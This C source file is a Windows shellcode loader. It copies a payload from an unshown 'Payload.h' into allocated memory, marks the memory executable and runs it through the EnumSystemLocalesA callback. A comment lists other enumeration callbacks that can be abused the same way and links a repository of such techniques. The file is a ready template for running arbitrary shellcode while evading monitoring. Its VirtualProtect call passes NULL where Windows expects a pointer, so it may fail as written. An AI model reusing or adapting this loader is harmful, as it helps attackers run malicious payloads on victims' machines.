#include <windows.h>
#include <stdio.h>
#include "Payload.h"

/*
Usable Callback Functions:
    1. EnumSystemLocalesA
    2. EnumSystemLocalesEx
    3. EnumDesktopsA
    4. EnumChildWindows
    5. EnumDateFormatsA
    6. EnumUILanguagesA
    7. EnumThreadWindows
    8. EnumTimeFormatsA
    9. EnumPropsExA

https://github.com/aahmad097/AlternativeShellcodeExec
*/


int main() {

    PVOID exec_mem = VirtualAlloc( NULL, payloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE );

    memcpy( exec_mem, payload, payloadSize );

    VirtualProtect( exec_mem, payloadSize, PAGE_EXECUTE_READ, NULL );

    EnumSystemLocalesA( ( LOCALE_ENUMPROCA )exec_mem, 0 );

    return 0;
}